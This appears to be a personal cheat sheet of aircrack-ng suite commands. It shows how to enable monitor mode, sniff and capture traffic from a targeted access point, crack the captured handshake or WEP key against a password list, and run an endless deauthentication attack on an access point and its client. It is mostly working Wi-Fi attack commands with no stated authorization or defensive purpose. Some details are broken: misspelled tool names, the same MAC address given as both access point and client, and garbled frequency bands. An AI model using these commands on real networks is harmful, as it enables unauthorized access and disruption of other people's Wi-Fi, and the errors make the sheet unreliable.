aircrack-ng => cracks wep keys

aircrack-ng  capture.cap -w Passwords.txt


AIRODUMP-NG -----------------------------------
airodump-ng => packet sniffer

sudo airodump-ng wlan0mon => scan devices , names airmon-ng
man airodump-ng 
FILTERS 

a ->  filter by devices or networks
tab -> move around
m/n -> put color

sudo airdump-ng wlan0mon -c 6 --bssid 94:8F:CF:B3:2F:4E

sudo airdump-ng wlan0mon -c 6 --bssid 94:8F:CF:B3:2F:4E -w capture  => .cap contains the wep key

sudo airdump-ng wlan0mon -b a => 5gigaherts
sudo airdump-ng wlan0mon -b abc => 5/2.5gigahertz




AIRMON-NG -----------------------------------
airmon-ng => places netowrk cars into monitor mode
 
sudo airmon-ng => check devices connected to pc
sudo airmon-ng start wlx9cefd5fbc96a => start monitor mode



AIREPLAY-NG ----------------------------------------

aireplay-ng --deauth 0 -a 94:8F:CF:B3:2F:4E -c 94:8F:CF:B3:2F:4E wlan0mon  => deauth accesspoint - client
